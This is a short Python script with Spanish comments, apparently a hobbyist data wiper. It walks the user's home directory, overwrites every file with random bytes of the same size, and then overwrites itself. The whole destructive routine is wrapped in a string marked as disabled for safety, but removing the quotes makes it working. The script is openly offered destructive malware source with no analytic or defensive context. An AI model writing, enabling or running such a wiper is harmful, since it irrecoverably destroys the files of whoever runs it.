#!/usr/bin/env python3

from os import path, walk
from secrets import token_bytes

# home del usuario
dirct = path.expanduser('~')

# INUTILIZADO POR SEGURIDAD
"""
# recursivamente, usa enlaces, puede causar un bucle en infinito
for raiz, carps, archs in walk(dirct, followlinks=True):
    # array de solo archivos, no enlaces
    fff = [path.join(raiz, f) for f in archs if path.isfile(path.join(raiz, f))]
    # sustitucion de datos
    for victima in fff:
        # cuanto pesa cada archivo
        tamn = path.getsize(victima)
        # datos aleatorios
        datos = token_bytes(tamn)
        # DESTRUCCION
        with open(victima, 'wb') as dest:
            dest.write(datos)

# AUTODESTRUCCION
ruta = path.abspath(path.realpath(__file__))
zzz = token_bytes(path.getsize(ruta))
with open(ruta, 'wb') as slfdest:
    slfdest.write(zzz)
"""

# mppr. J.G.V.
